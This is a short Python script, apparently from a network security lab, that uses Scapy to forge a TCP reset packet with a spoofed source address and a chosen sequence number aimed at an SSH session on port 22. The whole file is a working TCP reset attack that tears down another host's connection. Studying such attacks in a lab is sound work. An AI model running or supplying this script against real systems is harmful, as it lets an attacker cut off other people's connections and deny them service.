import sys
from scapy.all import *

print("sending reset packet...")
IPLayer = IP(src="10.10.10.172", dst = "10.10.10.180")
TCPLayer = TCP (sport=53750, dport=22, flags="R", seq=2697491996)
pkt=IPLayer/TCPLayer
ls(pkt)
send(pkt,verbose=0)
